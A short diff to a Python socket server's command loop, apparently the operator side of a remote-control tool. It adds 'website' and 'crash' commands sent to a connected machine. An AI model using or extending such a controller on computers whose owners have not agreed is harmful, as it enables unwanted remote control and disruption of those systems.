@@ -51,5 +51,11 @@ def main():
                 while input(" >> ") != "exit":
                     continue
                 receiver.stop_server()
+            elif command == "website":
+                conn.send(command.encode())
+                website = input("Website >> ")
+                conn.send(website.encode())
+            elif command == "crash":
+                conn.send(command.encode())
         conn.close()
 main()
